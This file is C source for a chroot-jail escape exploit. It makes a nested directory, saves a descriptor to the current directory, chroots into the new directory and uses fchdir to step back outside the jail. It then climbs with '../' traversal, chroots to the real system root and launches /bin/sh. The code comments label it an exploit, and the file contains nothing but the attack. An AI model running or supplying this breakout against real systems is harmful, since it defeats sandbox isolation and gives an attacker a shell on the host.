#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>

int main (int argc, char **argv, char **envp) {
	// Init the file descriptor
	int fd = 0;

	// Create the second chroot directory
	mkdir("./chroot_dir", 0755);

	// Open current dir as fd
	fd = open(".", O_RDONLY);

	// Error handling
	if(fd == -1) {
                perror("ERROR: open failed");
                exit(-1);
        }

	// chroot inside the new directory
	chroot("./chroot_dir");
	// Change directory to previously opened FD (which is outside the current chroot)
	fchdir(fd);
	// Change directory to / (number of ../ changes based on where the exploit is executed from)
	chdir("../../../../");
	// Chroot into current dir (should be system root if evrything went well)
	chroot(".");
	// Open a shell
	execl("/bin/sh", "-1", NULL);

	return 0;
}

